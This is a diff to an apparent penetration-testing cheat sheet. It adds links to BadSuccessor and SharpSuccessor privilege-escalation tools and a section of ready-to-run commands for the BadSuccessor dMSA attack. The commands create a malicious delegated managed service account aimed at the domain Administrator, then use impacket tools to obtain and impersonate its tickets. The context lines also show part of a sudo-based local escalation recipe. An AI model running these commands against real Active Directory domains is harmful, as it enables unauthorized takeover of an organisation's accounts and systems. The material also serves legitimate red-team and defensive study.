@@ -203,6 +203,7 @@
 | CVE-2025-53770 | ToolShell SharePoint RCE (0-day) (2) | https://github.com/MuhammadWaseem29/CVE-2025-53770 |
 | CVE-2025-5777 | Citrix Bleed 2 | https://github.com/bughuntar/CVE-2025-5777 |
 | CVE-2025-9074 | Docker Desktop (Windows) Container Escape - Host Write via Exposed Engine API | https://github.com/zenzue/CVE-2025-9074 |
+| n/a | BadSuccessor LPE | https://github.com/ibaiC/BadSuccessor |
 | n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
 | n/a | dompdf XSS to RCE (0-day) | https://positive.security/blog/dompdf-rce |
 | n/a | GSM Linux Kernel LPE (1) | https://github.com/jmpe4x/GSM_Linux_Kernel_LPE_Nday_Exploit |
@@ -222,6 +223,7 @@
 | n/a | RottenPotatoNG LPE | https://github.com/breenmachine/RottenPotatoNG |
 | n/a | RustPotato LPE | https://github.com/safedv/RustPotato |
 | n/a | SharpEfsPotato LPE | https://github.com/bugch3ck/SharpEfsPotato |
+| n/a | SharpSuccessor LPE | https://github.com/logangoins/SharpSuccessor |
 | n/a | SigmaPotato LPE | https://github.com/tylerdotrar/SigmaPotato |
 | n/a | SweetPotato LPE | https://github.com/CCob/SweetPotato |
 | n/a | SweetPotato LPE | https://github.com/uknowsec/SweetPotato |
@@ -2219,6 +2221,30 @@ gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
 echo "woot!"
 sudo -R woot woot
 rm -rf ${STAGE?}
+```
+
+## BadSuccessor Delegated Managed Service Account (dMSA) LPE
+
+> https://github.com/ibaiC/BadSuccessor
+
+```cmd
+PS C:\> .\BadSuccessor.exe find
+```
+
+```cmd
+PS C:\> .\BadSuccessor.exe escalate -targetOU "OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>" -dmsa evildmsa -targetUser "CN=Administrator,CN=Users,DC=<DOMAIN>,DC=<DOMAIN>" -dnshostname evildmsa -user <USERNAME> -dc-ip <RHOST>
+```
+
+```shell
+$ impacket-getTGT <DOMAIN>/<USERNAME>:<PASSWORD>
+```
+
+```shell
+$ export KRB5CCNAME=<FILE>.ccache
+```
+
+```shell
+$ python3 getST.py <DOMAIN>/<USERNAME> -dc-ip <RHOST> -self -dmsa -impersonate evildmsa$ -k -no-pass
 ```
 
 ## GodPotato LPE
